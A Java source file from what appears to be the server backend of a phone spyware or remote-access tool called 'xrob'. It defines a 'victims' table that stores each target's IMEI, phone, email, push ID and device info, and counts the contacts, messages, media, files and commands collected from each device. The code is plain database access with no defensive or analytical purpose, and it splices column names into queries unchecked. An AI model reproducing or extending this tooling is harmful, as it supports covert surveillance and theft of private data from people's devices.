package com.theah64.xrob.api.database.tables;

import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.database.tables.command.Commands;
import com.theah64.xrob.api.models.Victim;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;

/**
 * Created by theapache64 on 11/22/2015.
 */
public class Victims extends BaseTable<Victim> {

    public static final String COLUMN_IMEI = "imei";
    public static final String COLUMN_FCM_ID = "fcm_id";
    public static final java.lang.String COLUMN_API_KEY = "api_key";
    public static final String COLUMN_EMAIL = "email";
    public static final String COLUMN_PHONE = "phone";
    private static final String COLUMN_FCM_UPDATED_AT = "fcm_updated_at";
    public static final String COLUMN_DEVICE_HASH = "device_hash";
    public static final String COLUMN_DEVICE_NAME = "device_name";
    public static final String COLUMN_DEVICE_INFO_STATIC = "device_info_static";
    public static final String COLUMN_VICTIM_CODE = "victim_code";
    public static final String COLUMN_DEVICE_INFO_DYNAMIC = "device_info_dynamic";
    private static final String COLUMN_AS_LAST_DELIVERY_EPOCH = "last_delivery_epoch";
    private static final String COLUMN_AS_MEDIA_FILE_COUNT = "media_count";

    private Victims() {
        super("victims");
    }

    private static final Victims instance = new Victims();

    public static Victims getInstance() {
        return instance;
    }

    @Override
    public Victim get(String byColumn, String byValue) {

        final String query = String.format("SELECT v.id, v.name, v.email, v.phone, v.api_key, v.fcm_id, v.device_name, v.device_info_dynamic, (SELECT COUNT(id) FROM contacts WHERE victim_id = v.id) AS contacts, (SELECT COUNT(id) FROM deliveries WHERE victim_id = v.id) AS deliveries, (SELECT COUNT(id) FROM commands WHERE victim_id = v.id) AS commands, (SELECT COUNT(id) FROM file_bundles WHERE victim_id = v.id) AS file_bundles, (SELECT COUNT(id) FROM messages WHERE victim_id = v.id) AS messages, (SELECT COUNT(id) FROM media WHERE victim_id = v.id) AS media_count, (SELECT UNIX_TIMESTAMP(last_logged_at) FROM deliveries d WHERE d.victim_id = v.id ORDER BY id DESC LIMIT 1) AS last_delivery_epoch FROM victims v WHERE %s = ? LIMIT 1", byColumn);

        final java.sql.Connection con = Connection.getConnection();
        Victim victim = null;

        try {

            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, byValue);

            final ResultSet rs = ps.executeQuery();

            if (rs.next()) {
                //Collecting victim
                final String id = rs.getString(COLUMN_ID);
                final String name = rs.getString(COLUMN_NAME);
                final String phone = rs.getString(COLUMN_PHONE);
                final String email = rs.getString(COLUMN_EMAIL);
                final String apiKey = rs.getString(COLUMN_API_KEY);
                final String fcmId = rs.getString(COLUMN_FCM_ID);
                final String deviceName = rs.getString(COLUMN_DEVICE_NAME);
                final String deviceInfoDynamic = rs.getString(COLUMN_DEVICE_INFO_DYNAMIC);

                final int contactsCount = rs.getInt(Contacts.TABLE_NAME_CONTACTS);
                final int deliveryCount = rs.getInt(Deliveries.TABLE_NAME_DELIVERIES);
                final int commandsCount = rs.getInt(Commands.TABLE_NAME_COMMANDS);
                final int fileBundleCount = rs.getInt(FileBundles.TABLE_NAME_FILE_BUNDLES);
                final int messageCount = rs.getInt(Messages.TABLE_NAME_MESSAGES);
                final int mediaFileCount = rs.getInt(COLUMN_AS_MEDIA_FILE_COUNT);
                final long lastDeliveryEpoch = rs.getLong(COLUMN_AS_LAST_DELIVERY_EPOCH);

                victim = new Victim(id, name, email, phone, null, null, apiKey, fcmId, deviceName, null, deviceInfoDynamic, null, null, false, null, lastDeliveryEpoch);
                victim.setCounts(contactsCount, deliveryCount, commandsCount, fileBundleCount, messageCount, mediaFileCount);
            }

            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return victim;
    }

    /**
     * Used to add new victim to the database
     * null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, otherDeviceInfo, null, null, true
     */
    @Override
    public boolean add(Victim victim) {
        return addv3(victim) != null;
    }

    @Override
    public void addv2(Victim victim) throws RuntimeException {
        if (!add(victim)) {
            throw new RuntimeException("Unexpected error while adding new victim");
        }
    }

    @Override
    public String addv3(Victim victim) {
        String newVictimId = null;
        final String addVictimQuery = "INSERT INTO victims (name,email,phone,imei,device_hash,api_key,fcm_id,device_name,device_info_static,device_info_dynamic,victim_code) VALUES (?,?,?,?,?,?,?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();

        //To track the success
        boolean isVictimAdded = false;

        try {
            final PreparedStatement ps = con.prepareStatement(addVictimQuery, PreparedStatement.RETURN_GENERATED_KEYS);

            ps.setString(1, victim.getName());
            ps.setString(2, victim.getEmail());
            ps.setString(3, victim.getPhone());
            ps.setString(4, victim.getIMEI());

            ps.setString(5, victim.getDeviceHash());
            ps.setString(6, victim.getApiKey());
            ps.setString(7, victim.getFCMId());
            ps.setString(8, victim.getDeviceName());
            ps.setString(9, victim.getDeviceInfoStatic());
            ps.setString(10, victim.getDeviceInfoDynamic());
            ps.setString(11, victim.getVictimCode());

            if (ps.executeUpdate() == 1) {
                final ResultSet rs = ps.getGeneratedKeys();
                if (rs.first()) {
                    newVictimId = rs.getString(1);
                }
                rs.close();
            }

            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return newVictimId;
    }


    @Override
    public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {

        String queryFormat = "UPDATE victims SET %s = ? ";
        if (updateColumn.equals(COLUMN_FCM_ID)) {
            queryFormat += ", fcm_updated_at = NOW() ";
        }
        queryFormat += "WHERE %s = ?";

        final String query = String.format(queryFormat, updateColumn, whereColumn);

        boolean isVictimUpdated = false;
        final java.sql.Connection con = Connection.getConnection();


        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, newUpdateColumnValue);
            ps.setString(2, whereColumnValue);
            isVictimUpdated = ps.executeUpdate() == 1;
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return isVictimUpdated;
    }


}
